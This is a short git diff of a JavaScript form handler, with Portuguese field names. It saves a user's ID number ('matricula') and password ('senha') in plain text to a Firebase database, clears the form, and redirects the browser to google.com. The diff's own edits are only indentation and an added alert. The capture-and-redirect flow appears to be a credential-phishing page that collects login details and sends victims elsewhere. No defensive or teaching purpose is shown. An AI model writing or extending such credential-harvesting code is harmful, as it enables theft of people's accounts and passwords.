@@ -33,7 +33,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 set(novoUsuarioRef, {
                     matricula: matricula,
                     senha: senha,
-						  data: new Date(Date.now()).toLocaleString()
+		    data: new Date(Date.now()).toLocaleString()
                 }).then(() => {
                     document.getElementById('matricula').value = '';
                     document.getElementById('senha').value = '';
@@ -41,7 +41,8 @@ document.addEventListener('DOMContentLoaded', function() {
                     console.error("Erro ao salvar usuário: ", error);
                 });
             }
-	window.location.href = 'https://www.google.com';
+	    alert("c");
+	    window.location.href = 'https://www.google.com';
         });
     }
 
